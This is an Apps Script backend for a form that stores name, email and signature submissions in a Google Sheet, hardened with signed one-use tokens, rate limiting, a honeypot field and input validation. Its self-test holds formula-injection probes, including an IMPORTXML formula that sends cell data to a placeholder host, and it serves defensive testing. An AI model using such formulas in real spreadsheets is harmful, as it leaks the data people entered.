


/* ======================================================================
   1. LIMITS AND KEYS
   ====================================================================== */

var LIMITS = {
  bodyChars:     4096,        // a legitimate submit is ~250 characters
  nameMin:       2,
  nameMax:       80,
  emailMax:      254,         // RFC 5321 maximum
  tokenMinAgeMs: 1200,        // a human cannot load and submit faster than this
  tokenMaxAgeMs: 30 * 60 * 1000
};

/* Signing key - generated once, kept in Script Properties, never in
   this file, so the code can be shared or committed safely. */
function getSigningKey_() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('SIGNING_KEY');
  if (!key) {
    key = Utilities.base64Encode(
      Utilities.getUuid() + '.' + Utilities.getUuid() + '.' + Date.now()
    );
    props.setProperty('SIGNING_KEY', key);
  }
  return key;
}

function hmac_(message) {
  var raw = Utilities.computeHmacSha256Signature(message, getSigningKey_());
  return Utilities.base64EncodeWebSafe(raw).replace(/=+$/, '');
}

/* Constant-time compare: a byte-by-byte `===` on a MAC leaks, through
   response timing, how many leading bytes of a guess were correct. */
function safeEquals_(a, b) {
  var x = String(a), y = String(b);
  if (x.length !== y.length) return false;
  var diff = 0;
  for (var i = 0; i < x.length; i++) diff |= x.charCodeAt(i) ^ y.charCodeAt(i);
  return diff === 0;
}


/* ======================================================================
   2. TOKENS AND THE RATE LIMIT
   ====================================================================== */

/* Single-use submit token. A submit must be preceded by a GET; each
   token is HMAC-signed, valid 1.2 s - 30 min, and burned on first use
   (CacheService), so a captured request cannot be replayed. */
function issueToken() {
  var payload = Date.now() + '.' + Utilities.getUuid();
  return payload + '.' + hmac_(payload);
}

function consumeToken_(token) {
  if (typeof token !== 'string' || token.length > 200) return false;

  var parts = token.split('.');
  if (parts.length !== 3) return false;

  var issuedAt = parts[0], nonce = parts[1], mac = parts[2];
  if (!/^\d{13}$/.test(issuedAt) || !/^[0-9a-fA-F-]{36}$/.test(nonce)) return false;
  if (!safeEquals_(mac, hmac_(issuedAt + '.' + nonce))) return false;

  var age = Date.now() - Number(issuedAt);
  if (age < LIMITS.tokenMinAgeMs || age > LIMITS.tokenMaxAgeMs) return false;

  var cache = CacheService.getScriptCache();
  var key = 'tok:' + nonce;
  if (cache.get(key)) return false;
  cache.put(key, '1', Math.ceil(LIMITS.tokenMaxAgeMs / 1000) + 60);

  return true;
}

/* One global ceiling - at most RATE_MAX submits in any rolling
   RATE_WINDOW_MS across the whole endpoint (Apps Script has no client
   IP to build a per-visitor limit on). Real traffic never reaches it;
   a flood gets 'busy' until the window rolls forward, so one bad hour
   cannot spend the day's execution quota. Real timestamps, no fixed
   bucket. */
var RATE_MAX = 300;
var RATE_WINDOW_MS = 60 * 60 * 1000;   // one hour

function rateLimitOk_() {
  var cache  = CacheService.getScriptCache();
  var now    = Date.now();
  var cutoff = now - RATE_WINDOW_MS;

  var recent = [];
  (cache.get('rate') || '').split(',').forEach(function (s) {
    var t = Number(s);
    if (t >= cutoff) recent.push(t);
  });

  if (recent.length >= RATE_MAX) return false;

  recent.push(now);
  cache.put('rate', recent.join(','), Math.ceil(RATE_WINDOW_MS / 1000) + 60);
  return true;
}


/* ======================================================================
   3. INPUT VALIDATION
   ====================================================================== */

/* NFC, then strip C0/C1 controls, zero-width marks and bidi overrides,
   then collapse whitespace. */
function clean_(value) {
  if (typeof value !== 'string') return '';
  var s = value.normalize('NFC');
  var r = '';
  for (var i = 0; i < s.length; i++) {
    var c = s.charCodeAt(i);
    if (c < 32 || (c >= 127 && c <= 159)) { r += ' '; continue; }   // C0/C1 controls
    if ((c >= 8203 && c <= 8207) || (c >= 8234 && c <= 8238) ||     // zero-width + bidi
        (c >= 8294 && c <= 8297) || c === 65279) { continue; }
    r += s.charAt(i);
  }
  return r.replace(/\s+/g, ' ').trim();
}

/* Letters (any script), spaces and real-name punctuation. No digits,
   no symbols, nothing that could open a formula or a URL. */
var NAME_RE = /^[\p{L}\p{M}][\p{L}\p{M} '’.\-]*$/u;

/* Stricter than the RFC: one @, a dotted domain, a 2+ letter TLD. */
var EMAIL_RE = /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~.\-]{1,64}@[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*\.[A-Za-z]{2,63}$/;

function validateName_(raw) {
  var v = clean_(raw);
  if (v.length < LIMITS.nameMin || v.length > LIMITS.nameMax) return null;
  if (!NAME_RE.test(v)) return null;
  return v;
}

function validateEmail_(raw) {
  var v = clean_(raw).toLowerCase().replace(/\s/g, '');
  if (v.length < 6 || v.length > LIMITS.emailMax) return null;
  if (!EMAIL_RE.test(v)) return null;
  if (v.indexOf('..') !== -1) return null;
  if (v.charAt(0) === '.' || v.indexOf('.@') !== -1) return null;
  return v;
}

/* Returns { ok: true, record } or { ok: false, error }.
   `body` is the already-JSON-parsed request. Signature is validated
   (consent gesture) and stored in column D. */
function validateSubmission_(body) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) {
    return { ok: false, error: 'invalid' };
  }

  /* Honeypot: the page hides this field; a bot fills it. Silence is the
     answer - doPost turns this into a fake success. */
  if (clean_(body.company) !== '') return { ok: false, error: 'honeypot' };

  var fullName  = validateName_(body.fullName);
  var signature = validateName_(body.signature);
  var email     = validateEmail_(body.email);

  if (!fullName)  return { ok: false, error: 'invalid_name' };
  if (!email)     return { ok: false, error: 'invalid_email' };
  if (!signature) return { ok: false, error: 'invalid_signature' };

  return {
    ok: true,
    record: {
      /* Formatted here, always Europe/Bucharest, independent of the
         spreadsheet's own timezone. Stored as text - the plain string
         "09.09.2026 16:15", not a timestamp. */
      receivedAt: Utilities.formatDate(new Date(), 'Europe/Bucharest', 'dd.MM.yyyy HH:mm'),
      fullName:   fullName,
      signature:  signature,
      email:      email
    }
  };
}


/* ======================================================================
   4. THE SHEET
   ====================================================================== */

var SHEET_NAME = 'primeA';

function getInboxSheet_() {
  var file = SpreadsheetApp.getActive();
  return file.getSheetByName(SHEET_NAME) || file.insertSheet(SHEET_NAME, 0);
}

var COLUMNS = ['Data', 'Nume', 'Email', 'Signature'];

/* Duplicate guard - reads the Email column (column 3) and scans it in
   memory. doPost never returns what it finds, only yes/no. */
function emailExists_(sheet, email) {
  var last = sheet.getLastRow();
  if (last < 2) return false;   // header only, or empty

  var column = sheet.getRange(2, 3, last - 1, 1).getValues();
  for (var i = 0; i < column.length; i++) {
    var cell = String(column[i][0]).replace(/^'/, '').trim().toLowerCase();
    if (cell === email) return true;
  }
  return false;
}

/* Idempotent: writes the header row only on an empty tab. */
function ensureHeader_(sheet) {
  if (sheet.getLastRow() > 0) return;

  sheet.getRange(1, 1, 1, COLUMNS.length)
       .setValues([COLUMNS])
       .setFontWeight('bold');
  sheet.setFrozenRows(1);

  sheet.setColumnWidth(1, 170);   // Data
  sheet.setColumnWidth(2, 200);   // Nume
  sheet.setColumnWidth(3, 240);   // Email
  sheet.setColumnWidth(4, 200);   // Signature
}

/* A cell starting with = + - @ is a live formula in Sheets. A single
   leading apostrophe is Sheets' "literal text" marker: stored, not
   displayed, returned intact by getValue(). Every user cell gets one. */
function asLiteralText_(value) {
  var s = String(value == null ? '' : value);
  return "'" + s;
}

/* Appends one submission. Returns true when a row was written, false
   when the address had already applied. The duplicate check and the
   append share one lock. setValues() on an explicit range, not
   appendRow(), which re-parses its arguments as if typed. */
function writeRow(record) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) throw new Error('busy');

  try {
    var sheet = getInboxSheet_();
    ensureHeader_(sheet);

    if (emailExists_(sheet, record.email)) return false;

    var row = [
      asLiteralText_(record.receivedAt),
      asLiteralText_(record.fullName),
      asLiteralText_(record.email),
      asLiteralText_(record.signature)
    ];

    sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length).setValues([row]);
    SpreadsheetApp.flush();
    return true;
  } finally {
    lock.releaseLock();
  }
}


/* ======================================================================
   5. WEB APP ENTRY POINTS
   ====================================================================== */

/* Fixed-shape responses: a short code, never a message built from user
   input, never a stack trace. */
function respond_(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  var action = e && e.parameter ? e.parameter.action : '';
  if (action === 'token') {
    return respond_({ ok: true, token: issueToken() });
  }
  return respond_({ ok: false, error: 'not_found' });
}

function doPost(e) {
  try {
    if (!e || !e.postData || typeof e.postData.contents !== 'string') {
      return respond_({ ok: false, error: 'invalid' });
    }
    if (e.postData.contents.length > LIMITS.bodyChars) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var checked = validateSubmission_(body);

    /* A filled honeypot gets the same success envelope a person gets.
       Nothing is written. */
    if (!checked.ok && checked.error === 'honeypot') {
      return respond_({ ok: true });
    }
    if (!checked.ok) {
      return respond_({ ok: false, error: checked.error });
    }

    if (!consumeToken_(body.token)) {
      return respond_({ ok: false, error: 'token' });
    }

    if (!rateLimitOk_()) {
      return respond_({ ok: false, error: 'busy' });
    }

    /* writeRow returns false when this address has already applied. */
    if (!writeRow(checked.record)) {
      return respond_({ ok: false, error: 'duplicate' });
    }
    return respond_({ ok: true });

  } catch (err) {
    /* A lock timeout is transient - tell the visitor to retry. */
    if (err && err.message === 'busy') {
      return respond_({ ok: false, error: 'busy' });
    }
    console.error('doPost failed: ' + (err && err.stack ? err.stack : err));
    return respond_({ ok: false, error: 'server' });
  }
}


/* ======================================================================
   6. EDITOR TOOLS  (run from the Apps Script editor, not by visitors)
   ====================================================================== */

/* Run ONCE before the first deployment: creates the signing key, writes
   the header row, and gets the OAuth consent out of the way. */
function setup() {
  var sheet = getInboxSheet_();
  getSigningKey_();
  ensureHeader_(sheet);
  console.log('Ready. Writing to the "' + sheet.getName() + '" tab.');
}

/* Optional smoke test: fires formula-injection payloads at the
   validator, then writes one dummy row. Open the sheet, confirm the row
   is there and inert, then delete it. Safe to delete this function
   after you have deployed. */
function selfTest() {
  var probes = [
    '=IMPORTXML("https://example.invalid/?x="&A2,"//a")',
    '+1+1',
    '@SUM(A1:A9)',
    '-1-1'
  ];

  probes.forEach(function (probe) {
    var checked = validateSubmission_({
      fullName: probe, email: 'probe@example.com', signature: probe
    });
    if (checked.ok) throw new Error('validation let a formula through: ' + probe);
  });

  var written = writeRow({
    receivedAt: Utilities.formatDate(new Date(), 'Europe/Bucharest', 'dd.MM.yyyy HH:mm'),
    fullName:   'Test Ionescu',
    signature:  'Test Ionescu',
    email:      'test+' + Date.now() + '@example.com'
  });

  console.log(written
    ? 'selfTest passed - delete the test row from the sheet.'
    : 'selfTest ran but wrote nothing (duplicate guard).');
}
